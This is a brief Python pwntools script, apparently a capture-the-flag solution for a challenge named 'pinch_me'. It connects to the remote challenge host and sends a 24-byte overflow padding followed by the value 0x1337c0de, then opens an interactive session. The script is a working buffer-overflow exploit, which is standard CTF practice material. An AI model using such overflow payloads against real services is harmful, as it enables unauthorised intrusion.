from pwn import *

#p = process("./app/pinch_me")
p = remote("dctf1-chall-pinch-me.westeurope.azurecontainer.io", 7480)

payload = b"A" * 24
payload += p64(0x1337c0de)
p.sendlineafter("dreaming?", payload)
p.interactive()